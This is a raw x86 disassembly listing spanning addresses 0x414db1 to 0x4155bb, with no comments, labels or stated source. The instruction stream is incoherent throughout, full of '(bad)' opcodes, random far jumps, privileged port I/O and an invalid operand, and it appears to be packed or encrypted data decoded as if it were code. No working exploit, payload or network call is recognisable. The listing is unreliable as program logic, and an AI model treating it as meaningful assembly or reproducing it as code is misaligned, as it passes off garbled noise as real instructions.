  414db1:	jp     0x414e14
  414db3:	int3   
  414db4:	dec    ecx
  414db5:	mov    ss,WORD PTR [eax-0x50fa1edc]
  414dbb:	pop    ecx
  414dbc:	sbb    BYTE PTR [ebp+0x2d],dh
  414dbf:	lock mov esp,0x3afa6558
  414dc5:	aad    0xd6
  414dc7:	(bad)  
  414dc8:	fisttp QWORD PTR [esp+edx*4+0x68356acd]
  414dcf:	jge    0x414d5c
  414dd1:	fsub   st(0),st
  414dd3:	jmp    0x598f:0xdb0dd696
  414dda:	cli    
  414ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ddc:	sbb    ebx,DWORD PTR [edx+0x56dc2430]
  414de2:	dec    edx
  414de3:	push   eax
  414de4:	sbb    DWORD PTR [edx],edx
  414de6:	xchg   ebx,eax
  414de7:	pop    eax
  414de8:	jp     0x414d74
  414dea:	fiadd  DWORD PTR [ecx+0x2d19d620]
  414df0:	and    al,0x88
  414df2:	mov    cl,0xd1
  414df4:	or     edx,ebp
  414df6:	popa   
  414df7:	data16 jns 0x414df0
  414dfa:	or     ch,BYTE PTR [eax]
  414dfc:	cmp    bh,dh
  414dfe:	pop    eax
  414dff:	in     eax,0xcf
  414e01:	(bad)  
  414e02:	aad    0xff
  414e04:	pop    edi
  414e05:	enter  0x2c28,0x1
  414e09:	jbe    0x414dd5
  414e0b:	mov    edx,0xbf6c880f
  414e10:	das    
  414e11:	jns    0x414e79
  414e13:	sub    DWORD PTR [esi-0x4f0a124e],edi
  414e19:	add    eax,0xe78665e3
  414e1e:	repnz mov dl,dl
  414e21:	sar    DWORD PTR [ecx],0xad
  414e24:	mov    cl,0xab
  414e26:	in     al,dx
  414e27:	pop    esi
  414e28:	das    
  414e29:	sub    al,0xb
  414e2b:	sub    al,0x5e
  414e2d:	dec    ebp
  414e2e:	add    edx,DWORD PTR [esi+0x36]
  414e31:	add    BYTE PTR [ebp-0x12322418],ah
  414e37:	std    
  414e38:	stc    
  414e39:	pushf  
  414e3a:	mov    edx,0x580e1dd7
  414e3f:	pop    ecx
  414e40:	icebp  
  414e41:	fnsave [edx-0x58b23594]
  414e47:	xor    al,ch
  414e49:	or     al,0xa8
  414e4b:	push   0x9c1acf82
  414e50:	rcl    edi,0xf6
  414e53:	or     ecx,DWORD PTR [ebp-0x53]
  414e56:	mov    ebp,0xca401556
  414e5b:	adc    DWORD PTR [ecx],edx
  414e5d:	pop    ebp
  414e5e:	adc    al,0x39
  414e60:	test   DWORD PTR [ebx+0x21],edi
  414e63:	nop
  414e64:	enter  0x3f13,0xb3
  414e68:	xchg   edi,eax
  414e69:	mov    al,0x56
  414e6b:	add    DWORD PTR ds:0x670a4d53,eax
  414e71:	push   esi
  414e72:	or     eax,0xa0f4aed
  414e77:	ret    
  414e78:	test   eax,0x5edae38d
  414e7d:	adc    ecx,DWORD PTR cs:[edx-0x61]
  414e81:	mov    edx,0xddce98a8
  414e86:	(bad)  
  414e88:	cld    
  414e89:	adc    esp,DWORD PTR [edi-0x54924a90]
  414e8f:	add    BYTE PTR [ecx-0x3fc6ddfd],bl
  414e95:	push   ecx
  414e96:	aad    0x7b
  414e98:	adc    al,0x97
  414e9a:	je     0x414e8b
  414e9c:	mov    ebp,0x4ef63c6a
  414ea1:	lods   al,BYTE PTR ds:[esi]
  414ea2:	hlt    
  414ea3:	cmp    DWORD PTR [ecx-0x7de4fbe3],esp
  414ea9:	rcr    DWORD PTR [esi+0x3874762c],1
  414eaf:	mov    bl,0x9f
  414eb1:	clc    
  414eb2:	push   ebp
  414eb3:	add    bl,dh
  414eb5:	mov    edx,0xd5c9b99c
  414eba:	loop   0x414f09
  414ebc:	inc    esp
  414ebd:	out    dx,eax
  414ebe:	loopne 0x414f1b
  414ec0:	imul   DWORD PTR [edi]
  414ec2:	cmp    DWORD PTR [ebx-0x5b],0x646157
  414ec9:	or     al,0x9f
  414ecb:	jae    0x414e5e
  414ecd:	xor    cl,bl
  414ecf:	jne    0x414ed7
  414ed1:	into   
  414ed2:	mov    cl,0x91
  414ed4:	adc    ebx,edi
  414ed6:	cmc    
  414ed7:	pop    ecx
  414ed8:	push   es
  414ed9:	(bad)  {k6}
  414ede:	sbb    al,0xe7
  414ee0:	cdq    
  414ee1:	ds xchg ebx,eax
  414ee3:	mov    edi,DWORD PTR [ebx+0x3f184288]
  414ee9:	mov    cl,0x1e
  414eeb:	call   0x329:0x7201c198
  414ef2:	test   eax,0x31f0712f
  414ef7:	sub    al,BYTE PTR [eax]
  414ef9:	adc    al,0x8f
  414efb:	pusha  
  414efc:	leave  
  414efd:	ror    DWORD PTR [edx-0x1c],1
  414f00:	xchg   edi,eax
  414f01:	pushf  
  414f02:	cli    
  414f03:	stos   DWORD PTR es:[edi],eax
  414f04:	or     eax,0xd84d09f6
  414f09:	mov    edx,0xb0202809
  414f0e:	jp     0x414f5f
  414f10:	adc    al,0xf6
  414f12:	rol    DWORD PTR [esp+ecx*8-0x73],0x47
  414f17:	test   bh,al
  414f19:	ss aaa 
  414f1b:	fs xchg edi,eax
  414f1d:	test   al,0x65
  414f1f:	hlt    
  414f20:	sbb    dl,ch
  414f22:	adc    DWORD PTR [eax-0x7fec8ffc],ebp
  414f28:	push   ds
  414f29:	pop    es
  414f2a:	in     al,0x1a
  414f2c:	xchg   edi,eax
  414f2d:	sub    eax,0x2959ed31
  414f32:	xor    al,0xac
  414f34:	mov    bl,0x14
  414f36:	popa   
  414f37:	sub    eax,0x849a0a89
  414f3c:	cmp    ch,bh
  414f3e:	cmp    BYTE PTR [edi-0x4],cl
  414f41:	shl    cl,cl
  414f43:	jl     0x414efc
  414f45:	int    0x57
  414f47:	and    ecx,esp
  414f49:	sti    
  414f4a:	jbe    0x414f2b
  414f4c:	mov    eax,0x77dc126d
  414f51:	das    
  414f52:	arpl   WORD PTR [edi],sp
  414f54:	and    BYTE PTR [esi],ah
  414f56:	int3   
  414f57:	adc    ebx,DWORD PTR [ebx-0x18]
  414f5a:	or     dh,0x37
  414f5d:	pushf  
  414f5e:	push   0x42fdc25f
  414f63:	jl     0x414fc6
  414f65:	mov    fs,WORD PTR [ebx+0x129d23ae]
  414f6b:	pop    es
  414f6c:	pcmpgtw mm2,mm4
  414f6f:	jbe    0x414f16
  414f71:	shl    DWORD PTR [ecx-0x70532359],1
  414f77:	xor    BYTE PTR [ebx+0x2326bb49],cl
  414f7d:	jecxz  0x414f11
  414f7f:	fiadd  DWORD PTR [ecx]
  414f81:	sub    BYTE PTR [edx+0x74],dh
  414f84:	and    esi,edi
  414f86:	jmp    0xd651:0xbf7f8738
  414f8d:	jae    0x41500b
  414f8f:	and    al,0xbe
  414f91:	fcomp  QWORD PTR [eax-0x6a5eb202]
  414f97:	cld    
  414f98:	imul   ebp,DWORD PTR [ebp-0x5a],0x46
  414f9c:	or     eax,0x18b5f54
  414fa1:	xchg   edx,eax
  414fa2:	adc    ebx,DWORD PTR [edx-0x7]
  414fa5:	dec    ebp
  414fa6:	push   esp
  414fa7:	div    DWORD PTR [ebp+0x7ffa64e4]
  414fad:	add    ecx,eax
  414faf:	mov    cl,0x6f
  414fb1:	scas   eax,DWORD PTR es:[edi]
  414fb2:	jl     0x414fb2
  414fb4:	in     eax,dx
  414fb5:	pop    eax
  414fb6:	retf   
  414fb7:	fs aas 
  414fb9:	aam    0xe0
  414fbb:	ret    0xb615
  414fbe:	dec    esp
  414fbf:	mov    cs,WORD PTR [edi-0x5f6b1d5a]
  414fc5:	repz out dx,eax
  414fc7:	test   al,0xc9
  414fc9:	rcr    esi,cl
  414fcb:	fucomi st,st(6)
  414fcd:	pusha  
  414fce:	and    ecx,DWORD PTR [edi-0x27]
  414fd1:	pusha  
  414fd2:	and    eax,0x5ec8b3e3
  414fd7:	push   edi
  414fd8:	cli    
  414fd9:	dec    esi
  414fda:	ret    0xe804
  414fdd:	mov    eax,0x6c0e070c
  414fe2:	(bad)  
  414fe3:	fild   QWORD PTR [ebx-0x67]
  414fe6:	sub    DWORD PTR [ecx],0xffffffb2
  414fe9:	jge    0x414f8f
  414feb:	jnp    0x414f8e
  414fed:	div    edi
  414fef:	mov    eax,ds:0xadacacda
  414ff4:	repz mov bh,0x7d
  414ff7:	int    0x68
  414ff9:	dec    ecx
  414ffa:	jo     0x414f9b
  414ffc:	stos   BYTE PTR es:[edi],al
  414ffd:	and    edi,edi
  414fff:	int3   
  415000:	mov    ch,0x5
  415002:	lods   al,BYTE PTR ds:[esi]
  415003:	loopne 0x415039
  415005:	pop    esp
  415006:	stc    
  415007:	repz add al,0xeb
  41500a:	pop    esp
  41500b:	stc    
  41500c:	push   esi
  41500d:	cmp    al,BYTE PTR [ecx-0x2e]
  415010:	xchg   BYTE PTR [edi],al
  415012:	ret    0x44bb
  415015:	loop   0x414fec
  415017:	test   BYTE PTR [ebx],dl
  415019:	fcom   st(7)
  41501b:	hlt    
  41501c:	xor    ebp,esi
  41501e:	iret   
  41501f:	xchg   edi,eax
  415020:	mov    ecx,0x2c14bba8
  415025:	pop    ebx
  415026:	xrelease xchg DWORD PTR [ebp+0x6f1a6c2b],edx
  41502d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41502e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41502f:	aam    0x63
  415031:	sbb    BYTE PTR [edi-0x2f],al
  415034:	(bad)  
  415035:	clc    
  415036:	jae    0x41501d
  415038:	mov    ds:0x88703407,eax
  41503d:	arpl   WORD PTR [esi+0x23],cx
  415040:	xchg   BYTE PTR [ebx],ch
  415042:	and    BYTE PTR [esi-0x2672a7cc],cl
  415048:	shr    DWORD PTR [ecx-0x5332d7c9],0xa3
  41504f:	mov    esp,0x5ceb2ab0
  415054:	out    0x6c,eax
  415056:	in     al,dx
  415057:	out    0x70,eax
  415059:	in     al,dx
  41505a:	fisttp DWORD PTR [ebp-0x29bbc545]
  415060:	inc    edi
  415061:	loope  0x415067
  415063:	jno    0x41505f
  415065:	jnp    0x415084
  415067:	mov    edx,0xd4c6d559
  41506c:	mov    eax,ds:0x9d8358b2
  415071:	mov    dh,0xc9
  415073:	xlat   BYTE PTR ds:[ebx]
  415074:	jge    0x41504c
  415076:	add    ecx,DWORD PTR [ebx]
  415078:	jecxz  0x4150d7
  41507a:	and    ah,BYTE PTR [ebx+0x68f92ff4]
  415080:	and    ax,0x721a
  415084:	rcr    DWORD PTR [edx+0x47c0599f],1
  41508a:	mov    al,0x80
  41508c:	pop    es
  41508d:	jnp    0x4150b6
  41508f:	rol    DWORD PTR [ebp-0x50ea1a92],1
  415095:	out    dx,al
  415096:	push   ecx
  415097:	cmp    al,0x86
  415099:	mov    ecx,0x6c8c701
  41509e:	and    esi,DWORD PTR [ebx+eiz*8]
  4150a1:	gs fcmovne st,st(1)
  4150a4:	sbb    DWORD PTR [ecx-0x2ed37e02],edx
  4150aa:	xchg   DWORD PTR [edi-0x4],edx
  4150ad:	sti    
  4150ae:	call   0x5f9:0xc04ebf75
  4150b5:	cmp    dl,BYTE PTR [esi-0x3e309945]
  4150bb:	xchg   ecx,eax
  4150bc:	adc    bh,dl
  4150be:	fsubr  QWORD PTR [edi+0x56b58058]
  4150c4:	pusha  
  4150c5:	sbb    esi,ebx
  4150c7:	gs jge 0x415082
  4150ca:	jo     0x4150cd
  4150cc:	bound  esp,QWORD PTR [esi+0x202208e0]
  4150d2:	cmp    DWORD PTR [edi+ecx*1-0x1ec07d39],ebp
  4150d9:	ins    BYTE PTR es:[edi],dx
  4150da:	dec    edi
  4150db:	xor    bh,ah
  4150dd:	jae    0x415085
  4150df:	lea    eax,[esi]
  4150e1:	inc    esi
  4150e2:	and    al,0x6b
  4150e4:	jmp    0x415161
  4150e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e7:	rcl    dh,1
  4150e9:	add    esi,DWORD PTR [edx+0x33]
  4150ec:	push   eax
  4150ed:	cld    
  4150ee:	push   0xffffffa6
  4150f0:	imul   edi,DWORD PTR [esi-0x7e],0x6e
  4150f4:	cmp    BYTE PTR [edi-0x4b814f86],0x9e
  4150fb:	out    dx,eax
  4150fc:	ror    DWORD PTR [edi+0x1c],0x12
  415100:	retf   
  415101:	fmul   QWORD PTR fs:[esi-0x50aa91ae]
  415108:	mov    al,0xc6
  41510a:	bound  eax,QWORD PTR [ebx-0x6a]
  41510d:	pushf  
  41510e:	xchg   ecx,eax
  41510f:	dec    ecx
  415110:	rol    DWORD PTR [ecx+0x6d],cl
  415113:	inc    esi
  415114:	les    esp,FWORD PTR [edi]
  415116:	call   0x253654a6
  41511b:	jp     0x415159
  41511d:	sub    DWORD PTR ds:0xca5f8088,ecx
  415123:	mov    ecx,0x23d5e015
  415128:	dec    dx
  41512a:	push   ebp
  41512b:	mov    WORD PTR [edx+0xe],fs
  41512e:	jo     0x4150c0
  415130:	mov    ch,0xc4
  415132:	scas   al,BYTE PTR es:[edi]
  415133:	xlat   BYTE PTR ds:[ebx]
  415134:	fmul   QWORD PTR [edx+0x1001c157]
  41513a:	pop    ecx
  41513b:	fsubp  st(3),st
  41513d:	js     0x4150dc
  41513f:	jbe    0x415192
  415141:	xchg   edx,eax
  415142:	test   BYTE PTR [esi-0x3c],0xb1
  415146:	mov    ?,WORD PTR [ebp-0x724503cf]
  41514c:	push   0x75
  41514e:	ins    DWORD PTR es:[edi],dx
  41514f:	jbe    0x4150f3
  415151:	add    eax,0x9e7afb2f
  415156:	or     esp,esp
  415158:	xchg   edx,eax
  415159:	xchg   ecx,eax
  41515a:	in     al,0x7f
  41515c:	lds    esi,FWORD PTR [eax]
  41515e:	(bad)  
  41515f:	aad    0x0
  415161:	xor    ebx,esi
  415163:	and    DWORD PTR [ecx-0x2c],0x0
  415167:	js     0x4151e8
  415169:	pop    eax
  41516a:	push   esp
  41516b:	fs cmp eax,0x9aadee9e
  415171:	inc    ebp
  415172:	mov    bl,0x40
  415174:	data16 out dx,al
  415176:	fadd   QWORD PTR [edx]
  415178:	fidivr DWORD PTR [edx-0x9]
  41517b:	and    al,0x22
  41517d:	jecxz  0x4151e8
  41517f:	and    eax,0x831e38fb
  415184:	adc    ebx,ecx
  415186:	or     BYTE PTR es:[edx],ah
  415189:	jmp    0x41513d
  41518b:	xchg   esp,eax
  41518c:	sub    bh,bl
  41518e:	retf   0xdcce
  415191:	push   ss
  415192:	ins    DWORD PTR es:[edi],dx
  415193:	mov    eax,0xb9ffd78a
  415198:	push   edx
  415199:	pop    esp
  41519a:	out    dx,eax
  41519b:	lods   al,BYTE PTR ds:[esi]
  41519c:	(bad)  
  41519e:	stos   BYTE PTR es:[edi],al
  41519f:	ins    DWORD PTR es:[edi],dx
  4151a0:	into   
  4151a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151a2:	dec    ebx
  4151a3:	mov    esp,0xffa7338f
  4151a8:	and    ecx,DWORD PTR [edx-0x72b6db00]
  4151ae:	iret   
  4151af:	aas    
  4151b0:	xchg   edi,eax
  4151b1:	dec    ecx
  4151b2:	inc    ecx
  4151b3:	bound  ecx,QWORD PTR [edi]
  4151b5:	jb     0x415188
  4151b7:	sbb    ebx,DWORD PTR [eax+0x22]
  4151ba:	jg     0x415183
  4151bc:	cmp    DWORD PTR fs:[edi+0x342285fb],esp
  4151c3:	cmp    al,0xd
  4151c5:	dec    esp
  4151c6:	imul   eax,DWORD PTR [esi+0x4a8250d6],0x2b13f55e
  4151d0:	adc    BYTE PTR [esi],0xa2
  4151d3:	push   esp
  4151d4:	sti    
  4151d5:	mov    ecx,0x756107fe
  4151da:	adc    esp,DWORD PTR [eax-0x3e8fd9f1]
  4151e0:	dec    ecx
  4151e1:	sbb    DWORD PTR [edx-0x56],esi
  4151e4:	xchg   edi,eax
  4151e5:	push   edi
  4151e6:	pop    ecx
  4151e7:	test   DWORD PTR [ebx],ebx
  4151e9:	outs   dx,DWORD PTR ds:[esi]
  4151ea:	cli    
  4151eb:	and    ch,BYTE PTR gs:[esi+0x2f534eb2]
  4151f2:	in     al,dx
  4151f3:	push   ecx
  4151f4:	fdiv   st(5),st
  4151f6:	ret    
  4151f7:	and    ah,BYTE PTR [eax-0x7f0600e9]
  4151fd:	call   0x4e1cc95e
  415202:	inc    ebx
  415203:	pop    eax
  415204:	aas    
  415205:	inc    ebp
  415206:	lea    eax,[ecx*2-0x64921a0b]
  41520d:	lock ret 
  41520f:	mov    ds:0x5031003,al
  415214:	and    al,BYTE PTR [esi-0x779e807b]
  41521a:	xor    ebp,ecx
  41521c:	retf   
  41521d:	jl     0x41519f
  41521f:	dec    esp
  415220:	stc    
  415221:	xchg   edi,eax
  415222:	push   ds
  415223:	fnstenv [esi]
  415225:	lea    edx,ds:[edi-0x3d773ce5]
  41522c:	out    dx,eax
  41522d:	hlt    
  41522e:	or     ebx,esp
  415230:	mov    edx,0x20946f0e
  415235:	push   ecx
  415236:	add    al,0x12
  415238:	cmp    esi,DWORD PTR [ecx-0x9]
  41523b:	data16 test BYTE PTR [ebx+edi*1],0xd0
  415240:	mov    ah,0x78
  415242:	jmp    0xfaa8:0x15cee9af
  415249:	sar    DWORD PTR [esi+0x63c6d923],0x32
  415250:	fsub   st(6),st
  415252:	pop    esp
  415253:	popa   
  415254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415255:	test   eax,0x650116c8
  41525a:	mov    bh,0x5f
  41525c:	mov    DWORD PTR [edi+0x64],edi
  41525f:	push   esp
  415260:	xchg   edx,eax
  415261:	dec    esi
  415262:	mov    edx,0x64ad9df2
  415267:	dec    ebp
  415268:	popa   
  415269:	or     edx,DWORD PTR [edi+0x42b316a0]
  41526f:	(bad)  
  415270:	and    eax,0xa5ae6c96
  415275:	add    esp,esp
  415277:	push   edx
  415278:	bound  ecx,QWORD PTR [ecx+eiz*8]
  41527b:	sbb    BYTE PTR [edx+0x2e],0xdb
  41527f:	adc    BYTE PTR [esp+ecx*4],dh
  415282:	scas   al,BYTE PTR es:[edi]
  415283:	jne    0x415262
  415285:	(bad)  
  415286:	ror    BYTE PTR [ecx+ebp*8-0x37],1
  41528a:	out    dx,eax
  41528b:	aas    
  41528c:	not    DWORD PTR [edx]
  41528e:	cmp    DWORD PTR [ebp+0x390885fa],ebp
  415294:	dec    esp
  415295:	arpl   sp,cx
  415297:	pop    ebp
  415298:	push   ecx
  415299:	xor    BYTE PTR [ebx-0xf136c55],dh
  41529f:	xor    BYTE PTR [edi+0x6],0xe9
  4152a3:	(bad)  
  4152a4:	mov    bl,0x56
  4152a6:	shl    DWORD PTR [esi+0x52d3d287],cl
  4152ac:	bound  edi,QWORD PTR [ebp-0x1c8fc076]
  4152b2:	shr    esi,cl
  4152b4:	sbb    BYTE PTR [edx-0x57d6c393],dh
  4152ba:	mov    edx,0xe611eda7
  4152bf:	rcl    DWORD PTR [eax],0x11
  4152c2:	pop    edi
  4152c3:	or     eax,0xb586299a
  4152c8:	xchg   edi,eax
  4152c9:	nop
  4152ca:	jb     0x4152ba
  4152cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152cd:	xor    ecx,DWORD PTR [edi-0x49]
  4152d0:	lock xchg esp,eax
  4152d2:	cmp    esi,esi
  4152d4:	lds    eax,FWORD PTR [eax-0x4e44eb5f]
  4152da:	jnp    0x4152da
  4152dc:	sbb    DWORD PTR [ebx-0x2b],edi
  4152df:	mov    edx,0xd16c9fa3
  4152e4:	xor    al,0x8e
  4152e6:	ret    0x3473
  4152e9:	dec    eax
  4152ea:	and    BYTE PTR [ebx+0x6c],al
  4152ed:	ins    BYTE PTR es:[edi],dx
  4152ee:	jmp    0xc0b5:0x214ac0
  4152f5:	adc    ebx,ebx
  4152f7:	(bad)  
  4152f8:	adc    al,ch
  4152fa:	adc    eax,ebx
  4152fc:	mov    ch,0xc4
  4152fe:	xchg   esi,eax
  4152ff:	leave  
  415300:	ret    
  415301:	pop    ss
  415302:	xchg   bh,bh
  415304:	cmc    
  415305:	outs   dx,DWORD PTR ds:[esi]
  415306:	cmp    ecx,DWORD PTR [edx+edx*4+0x49054f4b]
  41530d:	fisub  WORD PTR [edi+ebx*8-0x13db5f11]
  415314:	cmp    DWORD PTR [ecx],0x50fe4574
  41531a:	xor    BYTE PTR [edx+0x8],dh
  41531d:	pop    ebp
  41531e:	in     eax,dx
  41531f:	in     al,dx
  415320:	scas   al,BYTE PTR es:[edi]
  415321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415322:	dec    esi
  415323:	push   0xfffffffd
  415325:	stos   DWORD PTR es:[edi],eax
  415326:	push   ebx
  415327:	imul   esp,DWORD PTR [edi+0x33],0xffffffc4
  41532b:	retf   
  41532c:	pop    es
  41532d:	cs in  al,dx
  41532f:	jne    0x415317
  415331:	adc    al,0x97
  415333:	fwait
  415334:	inc    ebp
  415335:	inc    edx
  415336:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415338:	stos   BYTE PTR es:[edi],al
  415339:	adc    al,0x21
  41533b:	inc    edx
  41533c:	loope  0x4153ac
  41533e:	add    bl,ah
  415340:	cmp    al,0xa7
  415342:	mov    esp,0x8fb497bf
  415347:	xchg   DWORD PTR [esp+ecx*2-0x212eb339],edi
  41534e:	add    ecx,esi
  415350:	rcr    dh,cl
  415352:	imul   ebp,DWORD PTR [esi+0x64],0x2d
  415356:	ror    DWORD PTR [eax-0x76],1
  415359:	(bad)  
  41535a:	mov    edx,0xc46bcc47
  41535f:	mov    bh,0x9a
  415361:	pop    esp
  415362:	mov    dh,0x7b
  415364:	shr    DWORD PTR [eax-0x328f0c96],1
  41536a:	jns    0x41530d
  41536c:	pop    edi
  41536d:	xor    eax,0xbb8369b5
  415372:	lea    ebx,[ebx+0x1d8f18b1]
  415378:	xchg   ecx,eax
  415379:	mov    edi,0x5b35ca77
  41537e:	jns    0x415344
  415380:	leave  
  415381:	call   0x84afbb3e
  415386:	jnp    0x415331
  415388:	push   esi
  415389:	xchg   ebp,eax
  41538a:	sub    bh,ch
  41538c:	mov    edx,0xdf3e05eb
  415391:	mov    dh,0x41
  415393:	scas   eax,DWORD PTR es:[edi]
  415394:	push   ecx
  415395:	xor    cl,BYTE PTR [ecx+0x5993538e]
  41539b:	loop   0x4153fb
  41539d:	xchg   ebx,eax
  41539e:	or     al,0x3d
  4153a0:	popa   
  4153a1:	test   dl,0xde
  4153a4:	fcom   st(5)
  4153a6:	and    ah,BYTE PTR [eax-0x514845b2]
  4153ac:	int    0x92
  4153ae:	cdq    
  4153af:	jbe    0x4153d4
  4153b1:	xchg   ebp,eax
  4153b2:	sbb    DWORD PTR [edx+0x5c],0x6d
  4153b6:	sbb    DWORD PTR [edx-0x16b43b7b],esi
  4153bc:	iret   
  4153bd:	sbb    eax,0x251b673e
  4153c2:	xchg   edx,eax
  4153c3:	pop    edx
  4153c4:	ins    DWORD PTR es:[edi],dx
  4153c5:	pop    esp
  4153c6:	sbb    dh,cl
  4153c8:	lea    esi,[eax-0x69]
  4153cb:	(bad)  
  4153cc:	mov    dh,0xf7
  4153ce:	rcr    DWORD PTR [esi-0x56],cl
  4153d1:	repnz (bad) 
  4153d4:	sti    
  4153d5:	pusha  
  4153d6:	in     al,0x3b
  4153d8:	ss sti 
  4153da:	jl     0x41542d
  4153dc:	add    bh,BYTE PTR [ebx-0x459c6952]
  4153e2:	jecxz  0x415407
  4153e4:	stc    
  4153e5:	rcr    BYTE PTR [ebp+0x11],0x68
  4153e9:	inc    edi
  4153ea:	xor    edx,DWORD PTR [edi-0x759cc0a7]
  4153f0:	outs   dx,DWORD PTR ds:[esi]
  4153f1:	jg     0x4153d9
  4153f3:	add    edx,DWORD PTR [eax+0x10c02d96]
  4153f9:	shr    DWORD PTR [ecx],0x6e
  4153fc:	inc    esp
  4153fd:	pop    edx
  4153fe:	(bad)  
  415400:	es pop ecx
  415402:	dec    ecx
  415403:	ss inc ebx
  415405:	imul   eax,DWORD PTR [ebp+0x34159e87],0x6b
  41540c:	sbb    DWORD PTR ss:[ecx],0x10d20d50
  415413:	pop    ss
  415414:	aas    
  415415:	ror    BYTE PTR [eax],0x14
  415418:	adc    BYTE PTR [esi+0x5428e267],0x15
  41541f:	push   0xffffffe5
  415421:	rol    DWORD PTR [edi],0x5c
  415424:	jo     0x415473
  415426:	dec    edx
  415427:	clc    
  415428:	lea    ecx,[esi-0x7e9413df]
  41542e:	inc    edx
  41542f:	outs   dx,BYTE PTR ds:[esi]
  415430:	(bad)  
  415431:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415432:	sbb    al,dl
  415434:	aaa    
  415435:	inc    esi
  415436:	clc    
  415437:	xchg   edx,eax
  415438:	sbb    dl,BYTE PTR ds:0xf8e21167
  41543e:	je     0x4153c9
  415440:	jmp    0x769c:0x7b181790
  415447:	add    al,0x6d
  415449:	mov    esi,0xdcdd7f09
  41544e:	cwde   
  41544f:	mov    eax,ds:0x7cdf65b8
  415454:	test   DWORD PTR [edx-0x21],0x36bfcf3e
  41545b:	cwde   
  41545c:	std    
  41545d:	retf   
  41545e:	jae    0x4154a8
  415460:	lahf   
  415461:	jmp    0x9ba419bb
  415466:	int3   
  415467:	mov    WORD PTR [edx-0x28a68703],ss
  41546d:	sbb    DWORD PTR [edi],0x8ac95a0d
  415473:	xor    DWORD PTR ds:0x67442556,esp
  415479:	xsavec ss:[edi-0xc070428]
  415481:	dec    ecx
  415482:	xchg   edx,eax
  415483:	xor    ebp,DWORD PTR [edx+ebp*4]
  415486:	sub    DWORD PTR [edx-0x10],edx
  415489:	mov    es,edx
  41548b:	xlat   BYTE PTR ds:[ebx]
  41548c:	push   esp
  41548d:	imul   eax,DWORD PTR [ecx+0x71],0x1a
  415491:	jecxz  0x4154b9
  415493:	xchg   ecx,eax
  415494:	lds    ecx,FWORD PTR [edi-0x7b645fc0]
  41549a:	sti    
  41549b:	jnp    0x4154f2
  41549d:	adc    al,BYTE PTR [ebx-0x40]
  4154a0:	sbb    ecx,DWORD PTR [eax+0x8fbb7fa]
  4154a6:	pop    edi
  4154a7:	lds    esi,FWORD PTR [edx]
  4154a9:	push   ds
  4154aa:	inc    esi
  4154ab:	add    ch,dh
  4154ad:	push   ss
  4154ae:	lock or BYTE PTR [edx+0x1e0ec9b3],dh
  4154b5:	dec    ebp
  4154b6:	aad    0xd
  4154b8:	cwde   
  4154b9:	xchg   BYTE PTR ds:0xa7417045,dl
  4154bf:	pop    ds
  4154c0:	stos   DWORD PTR es:[edi],eax
  4154c1:	mov    bl,0x37
  4154c3:	cli    
  4154c4:	xchg   ecx,eax
  4154c5:	pop    es
  4154c6:	ffree  st(2)
  4154c8:	out    0xbc,al
  4154ca:	popf   
  4154cb:	in     al,0xc3
  4154cd:	and    BYTE PTR [bx+si-0x15],dh
  4154d1:	mov    ah,0x65
  4154d3:	out    dx,al
  4154d4:	sub    eax,0xd868b202
  4154d9:	(bad)  
  4154da:	cwde   
  4154db:	rcr    DWORD PTR [ecx-0xdb97b41],1
  4154e1:	dec    esp
  4154e2:	into   
  4154e3:	add    al,0xd0
  4154e5:	sbb    eax,0xe165bcde
  4154ea:	xor    DWORD PTR [edi+esi*8-0x24],esp
  4154ee:	push   0x33cd1605
  4154f3:	xor    al,0xe2
  4154f5:	into   
  4154f6:	ss mov ebx,0xdac09c5f
  4154fc:	cli    
  4154fd:	test   BYTE PTR ds:0x46ee745,cl
  415503:	scas   al,BYTE PTR es:[edi]
  415504:	shl    DWORD PTR [ecx],1
  415506:	repz inc eax
  415508:	xlat   BYTE PTR ds:[ebx]
  415509:	ror    DWORD PTR [edi],0x39
  41550c:	mov    cl,0xed
  41550e:	call   0x90d2:0xecb3732a
  415515:	mov    esi,0x86aacc0
  41551a:	out    dx,al
  41551b:	mov    edi,0x68cea2f4
  415520:	js     0x415523
  415522:	je     0x415544
  415524:	adc    BYTE PTR [ebx+0x8],0x5c
  415528:	iret   
  415529:	sbb    eax,DWORD PTR [edx+0x6]
  41552c:	int3   
  41552d:	sbb    DWORD PTR [ebx+0x56],ebp
  415530:	adc    BYTE PTR [edi+0x101411df],cl
  415536:	ror    esi,1
  415538:	or     BYTE PTR [edx],al
  41553a:	add    eax,0x3d1ca578
  41553f:	pop    edi
  415540:	repz dec edi
  415542:	inc    esi
  415543:	fidivr DWORD PTR [eax+ebx*2+0x53ab6f5d]
  41554a:	jl     0x415596
  41554c:	xchg   ebp,eax
  41554d:	jne    0x41555d
  41554f:	or     ah,bl
  415551:	test   BYTE PTR [edx+0x3121b331],ah
  415557:	mov    DWORD PTR [edi-0x73],ecx
  41555a:	xor    eax,0x7de4bbb7
  41555f:	push   ebp
  415560:	and    ebp,DWORD PTR [esi-0x59]
  415563:	clc    
  415564:	out    dx,eax
  415565:	adc    al,0x36
  415567:	mov    cl,0x7b
  415569:	pop    ebp
  41556a:	in     eax,0x2
  41556c:	mov    dh,0xf9
  41556e:	(bad)  
  41556f:	imul   edx,DWORD PTR [edi+0x29a813b1],0x10
  415576:	sub    al,0x46
  415578:	test   eax,0xb59224aa
  41557d:	add    eax,0x63200515
  415582:	mov    ebx,0xdee7e68d
  415587:	or     DWORD PTR [ebx],edx
  415589:	mov    edx,0x498ef310
  41558e:	xchg   eax,edx
  415590:	jge    0x415526
  415592:	ret    0xd663
  415595:	dec    ebp
  415596:	aas    
  415597:	adc    BYTE PTR [ebp+0x654a58ba],bl
  41559d:	sub    edx,DWORD PTR [ebp-0x680a53d]
  4155a3:	add    bh,BYTE PTR [edi+0x63]
  4155a6:	adc    al,0xf3
  4155a8:	(bad)  
  4155a9:	call   0xcfed814a
  4155ae:	popf   
  4155af:	call   0xb210ef4c
  4155b4:	cli    
  4155b5:	mov    ebx,DWORD PTR ds:0x5d30f154
  4155bb:	lds    ebp,FWORD PTR [eax]
